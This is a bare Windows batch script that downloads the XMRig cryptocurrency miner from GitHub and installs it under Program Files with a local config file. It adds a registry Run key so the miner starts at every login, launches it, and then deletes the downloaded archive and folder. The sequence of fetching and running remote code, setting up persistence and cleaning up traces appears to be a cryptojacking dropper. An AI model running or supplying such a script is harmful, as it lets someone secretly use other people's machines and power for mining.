curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-gcc-win64.zip
tar -xf xmrig-6.16.4-gcc-win64.zip
mkdir xmrig
move xmrig-6.16.4\xmrig.exe xmrig
move config.json xmrig
move xmrig "C:\Program Files"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig\xmrig.exe"
start "C:\Program Files\xmrig\xmrig.exe"
del xmrig-6.16.4-gcc-win64.zip
del xmrig-6.16.4-gcc-win64
